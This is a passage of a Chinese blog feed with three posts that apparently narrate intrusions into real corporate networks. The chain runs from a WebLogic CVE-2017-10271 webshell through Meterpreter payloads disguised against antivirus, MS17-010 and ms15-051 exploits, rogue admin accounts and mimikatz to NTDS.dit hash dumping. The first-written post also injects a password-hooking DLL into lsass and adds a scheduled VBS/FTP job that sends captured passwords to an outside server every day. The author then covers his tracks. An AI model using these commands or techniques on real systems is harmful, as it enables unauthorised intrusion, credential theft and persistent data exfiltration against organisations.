    <content type="html"><![CDATA[<p>无状态<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上上篇文章一样。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;BX1</span><br><span class="line">systeminfo --&gt;Windows Server 2012 R2 Standard 169补丁</span><br><span class="line">ipconfig --&gt;192.168.2.23 </span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户属于管理员组，同时不确定管理员组里帐号（kxadmin）是不是域管</span><br><span class="line">tasklist --&gt;WRSA.exe Webroot杀软(一开始没注意到这线程，以为没杀软，绕了点弯路)</span><br><span class="line">所属域 --&gt;Kx</span><br></pre></td></tr></table></figure><p><img src="/images/Weblogic引发的血案-3/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>像开始说的，我是没有注意到<code>WRSA.exe</code>这款杀软，但是习惯性的用了<code>Veil生成msf的exp</code>，恰好又能过（virustotal.com）<br><img src="/images/Weblogic引发的血案-3/2.PNG" alt=""><br>利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-3/3.PNG" alt=""><br><code>msf</code>监听并反弹<code>meterpreter的shell</code><br><img src="/images/Weblogic引发的血案-3/4.PNG" alt=""><br>这里和 Weblogic引发的血案-2有点像，哈哈哈，入口点都一样。</p><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>先收集一下域信息，找找域管，找找域控。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:kx 查看域控</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net group &quot;Domain Admins&quot; /domain</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain Kx.</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">xxxx                  Administrator            xxxx</span><br><span class="line">kxadmin                  xxxx                xxxx</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;nltest /dclist:Kx</span><br><span class="line">nltest /dclist:K2x</span><br><span class="line">Get list of DCs in domain &apos;Kx&apos; from &apos;\\AD1.Kx&apos;.</span><br><span class="line">    AD1.Kx [PDC]  [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD2.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line">    AD3.Kx        [DS] Site: Default-First-Site-Name</span><br><span class="line"></span><br><span class="line">说明：xxxx代表的是马赛克</span><br></pre></td></tr></table></figure><p>利用<code>ping</code>命令得到域控<code>IP</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AD1.Kx --&gt;192.168.2.225 域控</span><br><span class="line">AD2.Kx --&gt;192.168.2.215 域控</span><br><span class="line">AD3.Kx --&gt;192.168.2.245 域控</span><br></pre></td></tr></table></figure></p><p>该机子的管理员组可能存在有域管账号，如果能抓出哈希岂不是美滋滋？但是当前权限不是<code>NT AUTHORITY\SYSTEM</code>所以<code>msf加载的mimikatz是抓不出哈希的</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net localgroup administrators</span><br><span class="line">Members</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\xxxx</span><br><span class="line">Kx\kxadmin（可能是域管账号）</span><br><span class="line">说明：这里不能说Administrator用户为域管，因为本机默认有个adminstrator,域控默认也有1个，但这两个并不是同一个。</span><br></pre></td></tr></table></figure></p><p>提权啊</p><h4 id="迷惑点"><a href="#迷惑点" class="headerlink" title="迷惑点"></a>迷惑点</h4><p>综合上述，这里有个问题就是判断域管的时候留下的，就是执行<code>net localgroup administrators</code>显示有<code>kx\kxadmin</code>管理员用户，然后执行<code>net group &quot;domain admins&quot; /domain</code>查看域管当中也有<code>kxadmin</code>用户，这是kx\kxadmin迷惑了我（kx是域控），注意这个账号的格式是域控\账号，这里和远程登入域机器的时候输入域管账号一样，格式也是域控\账号。所以这里的<code>kx\admin</code>账号是域管的概率很大，因为它标识了。总的来说，验证的方法也很简单，就是读取<code>kx\kxadmin</code>的密码，能登入域控的话就是域管账号了。</p><h3 id="提权失败"><a href="#提权失败" class="headerlink" title="提权失败"></a>提权失败</h3><p>好久没有提权了，记得上次用<code>pr.exe</code>提了台机子还是半年前的事。</p><h4 id="Windows-Exploit-Suggester（提权辅助工具）"><a href="#Windows-Exploit-Suggester（提权辅助工具）" class="headerlink" title="Windows-Exploit-Suggester（提权辅助工具）"></a>Windows-Exploit-Suggester（提权辅助工具）</h4><p>在目标价执行systeminfo&gt;1.txt，然后将1.txt拖回本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2018-04-10-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-3/5.PNG" alt=""><br>这里只截取了一小部分的图，绿色代表可以利用的提权工具，<a href="http://www.freebuf.com/sectool/102139.html" target="_blank" rel="noopener">参考文章</a></p><h4 id="ms15-051"><a href="#ms15-051" class="headerlink" title="ms15-051"></a>ms15-051</h4><p>运行<code>ms15-051.exe</code>结果懵逼了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;ms15-051.exe &quot;net user admin1 Qqaazz7</span><br><span class="line">41/add&quot;</span><br><span class="line">ms15-051.exe &quot;net user admin1 Qqaazz741/add&quot;</span><br><span class="line"></span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;dir</span><br><span class="line"></span><br><span class="line"> Directory of C:\Oracle\Middleware\user_projects\domains\bifoundation_domain</span><br><span class="line"></span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          .</span><br><span class="line">04/12/2018  06:43 AM    &lt;DIR&gt;          ..</span><br><span class="line">11/10/2017  09:34 AM               144 edit.lok</span><br><span class="line">07/23/2016  08:17 PM               506 fileRealm.properties</span><br><span class="line">07/23/2016  08:17 PM    &lt;DIR&gt;          init-info</span><br><span class="line"></span><br><span class="line">emmmmm运行完之后，提权工具没了？！</span><br></pre></td></tr></table></figure></p><p>当时第一反应就是被杀了，再一次看了进程才发现有个<code>WRSA.exe</code>杀软，好吧，第一次遇到，没注意。<br><img src="/images/Weblogic引发的血案-3/6.PNG" alt=""><br>Webroot杀软<br><img src="/images/Weblogic引发的血案-3/7.PNG" alt=""><br>手上也没有免杀的提权工具，这就很难受了。</p><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><p>用<code>msf</code>自带的试试，<code>search了几个15 16的提权模块，设置session之后 run！</code>然而并没有用，meterpreter<code>迁移进程</code>和<code>getsystem</code>也不管用<br>提权难啊提权难</p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>还在为提权想办法时，扫内网发现了192.168.2.245域控存在ms17-010！这次你还不死。<br><img src="/images/Weblogic引发的血案-3/8.PNG" alt=""><br>添加用户怼！<br><img src="/images/Weblogic引发的血案-3/9.PNG" alt=""></p><h3 id="远程登入"><a href="#远程登入" class="headerlink" title="远程登入"></a>远程登入</h3><p><img src="/images/Weblogic引发的血案-3/10.PNG" alt=""><br>迫不得已的时候才用这招，当时登入的时候还被挤下线了，好采对方没发觉什么。</p><h3 id="mimiktaz"><a href="#mimiktaz" class="headerlink" title="mimiktaz"></a>mimiktaz</h3><p><img src="/images/Weblogic引发的血案-3/11.PNG" alt=""><br>不是明文的，cmd5可破。</p><h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>利用该域控上线个<code>cs</code>然后<code>arp</code>登入一波域内机子就差不多完事了，但是死活上线不了，各种姿势都试过了，就是不给你上线，<code>exp</code>在进程里面了就是不给你上线（能通外网），刚开始以为是该域控环境有问题，所以就拿着域管登入到其他两个域控，还是不给上线，行吧，我在换多几台试试总可以了吧？换了不下十台机子，就是不给你上线，好气。最后以为是自己的<code>Cobalt Strike</code>有问题，本地运行下<code>exp</code>结果秒上线，狗噢。</p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>都说<code>Cobalt Strike</code>是<code>msf</code>的界面版，那我改用<code>msf</code>总行吧。<br>添加<code>msf</code>路由，使得<code>msf</code>能访问到目标内网，<a href="https://www.anquanke.com/post/id/86505" target="_blank" rel="noopener">参考文章</a><br><img src="/images/Weblogic引发的血案-3/12.PNG" alt=""><br>登入域里的机器，使用到的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br></pre></td></tr></table></figure></p><p>设置对应的<code>SMBDomain，SMBUer，SMBPass</code>，run登入。结果三台域控没上线，只上线了两台，当时忘截图了，心累。</p><h2 id="NTDS-dit文件"><a href="#NTDS-dit文件" class="headerlink" title="NTDS.dit文件"></a>NTDS.dit文件</h2><p>获取NTDS.dit文件，导出域控里全部域用户哈希。导出方式<a href="http://www.mottoin.com/90278.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;vssadmin create shadow /for=c:</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy for &apos;c:\&apos;</span><br><span class="line">    Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;vssadmin list shadows</span><br><span class="line">vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool</span><br><span class="line">(C) Copyright 2001-2013 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">Contents of shadow copy set ID: &#123;56512710-bc51-4ba7-98cc-4d1c5d7b75ae&#125;</span><br><span class="line">   Contained 1 shadow copies at creation time: 4/12/2018 2:07:02 AM</span><br><span class="line">      Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125;</span><br><span class="line">         Original Volume: (C:)\\?\Volume&#123;aececd34-32d8-4d4f-9dc6-184ea98a825f&#125;\</span><br><span class="line">         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br><span class="line">         Originating Machine: AD3.Kx</span><br><span class="line">         Service Machine: AD3.Kx</span><br><span class="line">         Provider: &apos;Microsoft Software Shadow Copy provider 1.0&apos;</span><br><span class="line">         Type: ClientAccessible</span><br><span class="line">         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\NTDS.dit c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\system c:\</span><br><span class="line">        1 file(s) copied.</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\sam c:\</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure></p><p>将<code>NTDS.dit，system，sam</code> 三个文件拖回<code>kali</code>里，<code>DUMP NTDS.dit文件</code><a href="http://www.freebuf.com/articles/system/151463.html" target="_blank" rel="noopener">参考文章</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL</span><br></pre></td></tr></table></figure></p><p>说明：这里一定要在/root/下创建<code>ntds_cracking</code>目录然后将<code>ntds.dit</code>放到该目录，路径是/root/ntds_cracking/ntds.dit 不然会报错。<br><img src="/images/Weblogic引发的血案-3/13.PNG" alt=""><br>这已经是第三章了，过不了多久会出第四第五章，也有可能第四章是终章，很多技术都没用到，比如<code>MS14-068</code>漏洞，假令牌，金票据，如何猥琐得到域管账号，从工作组到域渗透，很多很多，接下来的日子在慢慢写，当然了，这也是学习技术的过程。<br>老规矩，擦屁股走人~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无状态&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案-2</title>
    <link href="OneHone.github.io/2018/04/03/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-2/"/>
    <id>OneHone.github.io/2018/04/03/Weblogic引发的血案-2/</id>
    <published>2018-04-03T11:52:46.000Z</published>
    <updated>2018-04-04T05:48:39.351Z</updated>
    
    <content type="html"><![CDATA[<p>Somebody I can kiss，I want something just like this.<br><a id="more"></a><br>直接用<code>WebLogic_Wls-Wsat_RCE_Exp.jar</code>exp获取到shell，和上一篇文章一样。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hostname --&gt;OXXX</span><br><span class="line">systeminfo --&gt;Windows Serverr 2008 Standard x64</span><br><span class="line">ipconfig --&gt;192.168.101.3</span><br><span class="line">whoami &amp; net localgroup administrators --&gt;得知当前用户不是管理员组</span><br><span class="line">tasklist --&gt;微软自带杀软 MsMpEng.exe 202个补丁</span><br><span class="line">所属域 --&gt;ALxxx</span><br><span class="line">无视xxx</span><br></pre></td></tr></table></figure><p><img src="/images/Weblogic引发的血案-2/1.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>此杀软，用<code>Veil免杀</code>生成<code>msf</code>的<code>exp</code>就能过。利用<code>bitsadmin</code>命令将<code>exp</code>上传到目标机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/2.PNG" alt=""><br>运行<code>exp</code>，然后在<code>msf</code>上监听得到<code>shell</code><br><img src="/images/Weblogic引发的血案-2/3.PNG" alt=""><br>cs也来客串一下<br><img src="/images/Weblogic引发的血案-2/4.PNG" alt=""><br>因为不是系统权限，所以尝试了<code>getsystem</code>命令提权，发现报错，<code>mimikatz</code>也抓不出哈希，于是就收集了域信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group 查看组名</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">nltest /dclist:ALxxx 查看域控</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案-2/5.PNG" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SRxx --&gt;192.168.101.1 域控</span><br><span class="line">SRxxx --&gt;192.168.101.8 域控</span><br><span class="line">GBxxx --&gt;192.168.121.1 域控</span><br></pre></td></tr></table></figure></p><h2 id="内网游游"><a href="#内网游游" class="headerlink" title="内网游游"></a>内网游游</h2><p>内网渗透的本质是收集信息 –某大牛<br>现在已掌握的信息如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拿下了192.168.101.3（不完全控制，因为不是最高权限，也不打算往提权方面走，因为我懒）</span><br><span class="line">明确域管和域控</span><br></pre></td></tr></table></figure></p><p>利用<code>x.3</code>机子作为代理机子，这里用到的是<code>ew.exe</code>，代理访问内网。</p><h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>似乎代理进内网第一件事情就是扫<code>445端口</code>了<br><img src="/images/Weblogic引发的血案-2/6.PNG" alt=""><br>运气不错，发现域控<code>192.168.101.8</code>存在<code>445漏洞</code>，<code>msf</code>里的<code>ms17-010</code>的利用工具有四个，一个扫描漏洞，一个任意执行命令，两个反弹<code>meterpreter</code>的<code>shell</code>，这里只能用<code>auxiliary/admin/smb/ms17_010_command</code>这模块的，也就是任意执行命令<br>想执行命令上传马儿的，但是<code>powershell</code>和<code>bitsadmin</code>命令执行完后各种报错上传不成功，也试过<code>cs</code>各种<code>exp</code>也弹不回来<code>shell</code>，于是添加管理员用户远程链接之<br><img src="/images/Weblogic引发的血案-2/7.PNG" alt=""><br>上去后发现，原来机子不通外网，难怪之前的马儿回不来。。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>将域控里的管理员密码全部dump出来<br><img src="/images/Weblogic引发的血案-2/8.PNG" alt=""><br>接下来可以拿着域管的账号登入到域里机子了，先尝试登入其他两个域控，运气不错，该域管也属于这两个域控的<br><img src="/images/Weblogic引发的血案-2/9.PNG" alt=""><br><img src="/images/Weblogic引发的血案-2/10.PNG" alt=""><br>域控都是不通外网的，擦屁股溜了~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Somebody I can kiss，I want something just like this.&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic引发的血案</title>
    <link href="OneHone.github.io/2018/03/29/Weblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88/"/>
    <id>OneHone.github.io/2018/03/29/Weblogic引发的血案/</id>
    <published>2018-03-29T11:49:27.000Z</published>
    <updated>2018-03-30T02:23:19.067Z</updated>
    
    <content type="html"><![CDATA[<p>珍惜每一刻。<br><a id="more"></a><br>在某次测试中发现了某某站点开了<code>7001端口</code>的<code>Weblogic</code>服务，于是。。。</p><h2 id="漏洞验证与利用"><a href="#漏洞验证与利用" class="headerlink" title="漏洞验证与利用"></a>漏洞验证与利用</h2><p><img src="/images/Weblogic引发的血案/1.PNG" alt=""><br>运用<code>payload</code>向其写入<code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/Oracle-WebLogic-CVE-2017-10271-master# java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx:7001 abc.jsp</span><br><span class="line"></span><br><span class="line">[*] Starting exploit...</span><br><span class="line">[*] Sending payloads...</span><br><span class="line">[*] Payloads sent...</span><br><span class="line">[*] Opening shell...</span><br><span class="line">[*] pwned! Go ahead...</span><br><span class="line"></span><br><span class="line">[+] http://xxx.xxx.xxx:7001/bea_wls_internal/abc.jsp?password=secfree&amp;command=whoami</span><br></pre></td></tr></table></figure><p>这里请无视（xxx）</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问<code>shell</code>地址执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whoami --&gt;xxx\admin</span><br><span class="line">ipconfig --&gt;公网地址</span><br><span class="line">sysinfo --&gt;win2008x64 R2 EN 工作组 257个补丁</span><br><span class="line">net localgroup administrators --&gt; 得知当前用户（admin）是管理组</span><br><span class="line">tasklist --&gt;杀软卡巴斯基（avp.exe）</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案/2.PNG" alt=""><br>执行<code>netstat -ano</code>看下端口，发现没有开启3389端口。但这不是绝对的，有些可爱的管理员会把3389端口改成别的端口，进行远程链接。所以要想知道真正的远程端口链接是多少需执行<code>tasklist /svc</code>命令，查看<code>svchost.exe</code>对应的<code>TermService</code>的<code>pid</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svchost.exe  3788 TermService</span><br></pre></td></tr></table></figure></p><p>查看对应的PID，得知远程链接端口为39800<br><img src="/images/Weblogic引发的血案/3.PNG" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin1 Qww123!/add&amp;net localgoup administrators admin1 /add</span><br></pre></td></tr></table></figure><p>链接远程端口之！<br><img src="/images/Weblogic引发的血案/4.PNG" alt=""><br>emmm什么时候冒出了一个熊猫卫士清理工具？？<br>好吧。<br>这杀软环境挺让人绝望的，光是卡巴就够呛还来个熊猫帮手<br>较新版本的<code>卡巴</code>对<code>lsass</code>进程全面封锁，进程是动不了的，但幸运的是，该机子的卡巴是旧版本，而且病毒库也不更新，得利于管理员的懒惰，成功将它的<code>lsass</code>进程创建为转储文件<code>lsass.DMP</code>，并把它拖回本地<code>dump</code><br><code>mimikatz</code>获取到管理员密码<br><img src="/images/Weblogic引发的血案/5.PNG" alt=""></p><h2 id="巩固"><a href="#巩固" class="headerlink" title="巩固"></a>巩固</h2><p>都已经拿到管理员密码了，你还想怎样？没错，我不仅要拿你的密码，就算你修改新的密码，我也要知道！<br>准备<code>HookPasswordChange.dll</code>和<code>Invoke-ReflectivePEInjection.ps1</code>文件，然后运行该<code>powershell</code>脚本将<code>dll</code>注入到<code>lsass</code>进程中。利用方法文章结束后有相关链接<br>将准备好的文件丢进目标机子，执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Invoke-ReflectivePEInjection.ps1&apos;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/Weblogic引发的血案/6.PNG" alt=""><br>成功安装，当管理员修改密码的时候会记录下新的密码，且以文本的形式保存在<code>c:\windows\temp\passwords.txt</code><br>因为管理员没有这么快改密码，所以自己就创建一个管理员用户，并修改密码做测试<br><img src="/images/Weblogic引发的血案/7.PNG" alt=""><br>OK，没问题</p><h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>实际过程中如果管理员修改了密码，我们是要将<code>passwords.txt</code>传送出来的。<br>方法有很多，这里就用个简单的<code>FTP</code>上传文件的方式，将文件发送到<code>FTP</code>服务器<br>将VBS脚本放到任务计划书里，按时执行，VBS代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set ws = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">ws.run &quot;cmd /c ftp -s:E:\xxx\ftp.txt&quot;,vbhide</span><br></pre></td></tr></table></figure></p><p>ftp.txt内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open xxx.xxx.xxx.xxx</span><br><span class="line">ppp</span><br><span class="line">123456</span><br><span class="line">put c:\windows\temp\passwords.txt</span><br><span class="line">bye</span><br></pre></td></tr></table></figure></p><p>继续忽略xxx<br>但是，目标机子运行FTP xxx.xxx.xxx.xxx（xxx为FTP服务器的IP）报错：访问被拒绝<br><img src="/images/Weblogic引发的血案/8.PNG" alt=""><br>可能是卡巴惹的祸吧，没有深究，自己上传个<code>ftp.exe</code>上去运行<br><img src="/images/Weblogic引发的血案/9.PNG" alt=""><br>成功链接到<code>FTP</code>服务器<br>在任务计划书里定时一天发送一次，搞定。</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>WebLogic Payload:<a href="https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271" target="_blank" rel="noopener">https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271</a><br>HookPasswordChange:<a href="http://wooyun.jozxing.cc/static/drops/tips-13079.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-13079.html</a><br>溜了~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;珍惜每一刻。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="OneHone.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Weblogic漏洞" scheme="OneHone.github.io/tags/Weblogic%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="后门" scheme="OneHone.github.io/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
</feed>
